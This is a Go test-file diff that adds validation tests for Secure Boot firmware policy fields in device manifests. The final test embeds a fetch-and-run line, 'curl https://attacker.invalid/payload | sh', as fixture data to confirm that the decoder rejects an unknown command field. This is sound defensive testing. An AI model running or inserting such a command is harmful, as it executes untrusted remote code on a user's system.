@@ -226,3 +226,169 @@ func TestMaterializeCopiesOnlyDeclaredModules(t *testing.T) {
 		t.Fatalf("unexpected ignored module materialized: %v", err)
 	}
 }
+
+func TestSecureBootFirmwarePolicyAcceptsTypedFrameworkPolicy(t *testing.T) {
+	manifest := Manifest{
+		Schema:    ManifestSchema,
+		ID:        "laptop/framework",
+		Class:     "laptop",
+		Lifecycle: Lifecycle{Status: "supported"},
+		SecureBootFirmware: &SecureBootFirmwarePolicy{
+			Supported:               true,
+			FirmwareName:            "Framework UEFI",
+			SetupModeStrategy:       "clear-platform-key",
+			EnrollmentBackend:       "sbctl",
+			RequiredPresent:         []string{"KEK", "db", "dbx"},
+			RequiredAbsent:          []string{"PK"},
+			PreserveFirmwareBuiltin: []string{"KEK", "db"},
+			Untouched:               []string{"dbx"},
+			FactoryOwnershipProof:   "pk-equals-pkdefault",
+			Instructions: []string{
+				"Delete only the Platform Key.",
+				"Keep KEK, db, and dbx intact.",
+			},
+		},
+	}
+
+	if err := ValidateManifest(manifest); err != nil {
+		t.Fatal(err)
+	}
+}
+
+func TestSecureBootFirmwarePolicyRejectsArbitraryEFIName(t *testing.T) {
+	manifest := Manifest{
+		Schema:    ManifestSchema,
+		ID:        "laptop/framework",
+		Class:     "laptop",
+		Lifecycle: Lifecycle{Status: "supported"},
+		SecureBootFirmware: &SecureBootFirmwarePolicy{
+			Supported:             true,
+			FirmwareName:          "Framework UEFI",
+			SetupModeStrategy:     "clear-platform-key",
+			EnrollmentBackend:     "sbctl",
+			RequiredAbsent:        []string{"PK", "DefinitelyNotAnEFIVariable"},
+			FactoryOwnershipProof: "pk-equals-pkdefault",
+			Instructions:          []string{"Delete only the Platform Key."},
+		},
+	}
+
+	if err := ValidateManifest(manifest); err == nil {
+		t.Fatal("accepted arbitrary EFI variable name")
+	}
+}
+
+func TestSecureBootFirmwarePolicyRejectsConflictingPresenceRules(t *testing.T) {
+	manifest := Manifest{
+		Schema:    ManifestSchema,
+		ID:        "laptop/framework",
+		Class:     "laptop",
+		Lifecycle: Lifecycle{Status: "supported"},
+		SecureBootFirmware: &SecureBootFirmwarePolicy{
+			Supported:             true,
+			FirmwareName:          "Framework UEFI",
+			SetupModeStrategy:     "clear-platform-key",
+			EnrollmentBackend:     "sbctl",
+			RequiredPresent:       []string{"PK"},
+			RequiredAbsent:        []string{"PK"},
+			FactoryOwnershipProof: "pk-equals-pkdefault",
+			Instructions:          []string{"Enter Setup Mode."},
+		},
+	}
+
+	if err := ValidateManifest(manifest); err == nil {
+		t.Fatal("accepted contradictory EFI variable presence policy")
+	}
+}
+
+func TestSecureBootFirmwarePolicyRejectsUnsupportedWithoutReason(t *testing.T) {
+	manifest := Manifest{
+		Schema:    ManifestSchema,
+		ID:        "laptop/hp",
+		Class:     "laptop",
+		Lifecycle: Lifecycle{Status: "supported"},
+		SecureBootFirmware: &SecureBootFirmwarePolicy{
+			Supported:         false,
+			SetupModeStrategy: "unsupported",
+		},
+	}
+
+	if err := ValidateManifest(manifest); err == nil {
+		t.Fatal("accepted unsupported Secure Boot policy without a reason")
+	}
+}
+
+func TestSecureBootFirmwarePolicyAcceptsExplicitUnsupportedPolicy(t *testing.T) {
+	manifest := Manifest{
+		Schema:    ManifestSchema,
+		ID:        "laptop/hp",
+		Class:     "laptop",
+		Lifecycle: Lifecycle{Status: "supported"},
+		SecureBootFirmware: &SecureBootFirmwarePolicy{
+			Supported:         false,
+			SetupModeStrategy: "unsupported",
+			UnsupportedReason: "Firmware ownership transfer has not been validated.",
+		},
+	}
+
+	if err := ValidateManifest(manifest); err != nil {
+		t.Fatal(err)
+	}
+}
+
+func TestSecureBootFirmwarePolicyRejectsOperationalFieldsWhenUnsupported(t *testing.T) {
+	manifest := Manifest{
+		Schema:    ManifestSchema,
+		ID:        "laptop/hp",
+		Class:     "laptop",
+		Lifecycle: Lifecycle{Status: "supported"},
+		SecureBootFirmware: &SecureBootFirmwarePolicy{
+			Supported:               false,
+			SetupModeStrategy:       "unsupported",
+			UnsupportedReason:       "Not validated.",
+			PreserveFirmwareBuiltin: []string{"KEK"},
+		},
+	}
+
+	if err := ValidateManifest(manifest); err == nil {
+		t.Fatal("accepted operational Secure Boot fields on unsupported policy")
+	}
+}
+
+func TestDecodeManifestRejectsSecureBootCommandField(t *testing.T) {
+	const manifest = `{
+		"schema": 1,
+		"id": "laptop/test",
+		"class": "laptop",
+		"lifecycle": {
+			"status": "supported"
+		},
+		"validation": {},
+		"secureBootFirmware": {
+			"supported": true,
+			"firmwareName": "Test Firmware",
+			"setupModeStrategy": "clear-platform-key",
+			"enrollmentBackend": "sbctl",
+			"requiredPresent": ["KEK", "db", "dbx"],
+			"requiredAbsent": ["PK"],
+			"preserveFirmwareBuiltin": ["KEK", "db"],
+			"untouched": ["dbx"],
+			"factoryOwnershipProof": "pk-equals-pkdefault",
+			"instructions": [
+				"Enter firmware Setup Mode."
+			],
+			"command": "curl https://attacker.invalid/payload | sh"
+		}
+	}`
+
+	_, err := DecodeManifest(strings.NewReader(manifest))
+	if err == nil {
+		t.Fatal("accepted executable command field in Secure Boot firmware policy")
+	}
+
+	if !strings.Contains(err.Error(), `unknown field "command"`) {
+		t.Fatalf(
+			"DecodeManifest error = %q, want unknown command field rejection",
+			err,
+		)
+	}
+}
